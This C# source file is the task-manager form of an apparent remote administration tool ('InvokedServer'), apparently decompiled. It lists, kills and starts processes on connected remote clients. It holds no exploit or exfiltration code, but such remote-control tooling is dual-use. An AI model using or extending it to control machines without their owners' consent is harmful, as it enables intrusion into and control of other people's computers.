

using System;
using System.Collections.Generic;
using System.Windows.Forms;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedServer.Controls;
using InvokedServer.Helper;
using InvokedServer.Messages;
using InvokedServer.Networking;


namespace InvokedServer.Forms
{
	public partial class FrmTaskManager : Form
	{
		private readonly Client _connectClient;
		private readonly TaskManagerHandler _taskManagerHandler;
		private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();

		public static FrmTaskManager CreateNewOrGetExisting(Client client)
		{
			if (FrmTaskManager.OpenedForms.ContainsKey(client))
				return FrmTaskManager.OpenedForms[client];
			FrmTaskManager newOrGetExisting = new FrmTaskManager(client);
			newOrGetExisting.Disposed += (EventHandler)((sender, args) => FrmTaskManager.OpenedForms.Remove(client));
			FrmTaskManager.OpenedForms.Add(client, newOrGetExisting);
			return newOrGetExisting;
		}

		public FrmTaskManager(Client client)
		{
			this._connectClient = client;
			this._taskManagerHandler = new TaskManagerHandler(client);
			this.RegisterMessageHandler();
			this.InitializeComponent();
		}

		private void RegisterMessageHandler()
		{
			this._connectClient.ClientState += new Client.ClientStateEventHandler(this.ClientDisconnected);
			this._taskManagerHandler.ProgressChanged += new MessageProcessorBase<Process[]>.ReportProgressEventHandler(this.TasksChanged);
			this._taskManagerHandler.ProcessActionPerformed += new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
			MessageHandler.Register((IMessageProcessor)this._taskManagerHandler);
		}

		private void UnregisterMessageHandler()
		{
			MessageHandler.Unregister((IMessageProcessor)this._taskManagerHandler);
			this._taskManagerHandler.ProcessActionPerformed -= new TaskManagerHandler.ProcessActionPerformedEventHandler(this.ProcessActionPerformed);
			this._taskManagerHandler.ProgressChanged -= new MessageProcessorBase<Process[]>.ReportProgressEventHandler(this.TasksChanged);
			this._connectClient.ClientState -= new Client.ClientStateEventHandler(this.ClientDisconnected);
		}

		private void ClientDisconnected(Client client, bool connected)
		{
			if (connected)
				return;
			this.Invoke(new MethodInvoker(((Form)this).Close));
		}

		private void TasksChanged(object sender, Process[] processes)
		{
			this.lstTasks.Items.Clear();
			foreach (Process process in processes)
				this.lstTasks.Items.Add(new ListViewItem(new string[3]
				{
		  process.Name,
		  process.Id.ToString(),
		  process.MainWindowTitle
				}));
			this.processesToolStripStatusLabel.Text = string.Format("Processes: {0}", (object)processes.Length);
		}

		private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
		{
			string str = string.Empty;
			switch (action)
			{
				case ProcessAction.Start:
					str = result ? "Process started successfully" : "Failed to start process";
					break;
				case ProcessAction.End:
					str = result ? "Process ended successfully" : "Failed to end process";
					break;
			}
			this.processesToolStripStatusLabel.Text = str;
		}

		private void FrmTaskManager_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Task Manager", this._connectClient);
			this._taskManagerHandler.RefreshProcesses();
		}

		private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.UnregisterMessageHandler();
		}

		private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			foreach (ListViewItem selectedItem in this.lstTasks.SelectedItems)
				this._taskManagerHandler.EndProcess(int.Parse(selectedItem.SubItems[1].Text));
		}

		private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string empty = string.Empty;
			if (InputBox.Show("Process name", "Enter Process name:", ref empty) != DialogResult.OK)
				return;
			this._taskManagerHandler.StartProcess(empty);
		}

		private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this._taskManagerHandler.RefreshProcesses();
		}

		private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			this.lstTasks.LvwColumnSorter.NeedNumberCompare = e.Column == 1;
		}
	}
}